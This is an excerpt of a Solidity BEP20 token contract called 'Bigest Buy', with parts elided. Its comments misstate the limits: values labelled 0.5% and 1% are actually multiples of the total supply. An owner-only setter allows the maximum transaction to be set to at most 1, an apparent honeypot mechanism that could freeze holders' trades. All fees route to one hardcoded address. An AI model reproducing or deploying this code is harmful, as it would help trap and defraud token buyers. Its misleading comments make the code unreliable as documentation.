...
contract BIGEST_BUY is Context, IBEP20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Bigest Buy";
    ...
    uint256 public _maxTxAmount = _tTotal * 80000 / 10000; //Initial 0.5%
    uint256 public _maxWalletSize = _tTotal * 90000 / 10000; //Initial 1%

    // Fees Receivers
    address public devFeeReceiver = 0xd19453d100418887413ff19A1bB8acC410ce6a4a;
    address public marketingFeeReceiver = 0xd19453d100418887413ff19A1bB8acC410ce6a4a;
    address public liquidityFeeReceiver = 0xd19453d100418887413ff19A1bB8acC410ce6a4a;
    ...
    function setMaxTxAmount(uint256 amount) external onlyOwner {
        require(amount <=1, "Invalid max tx amount");
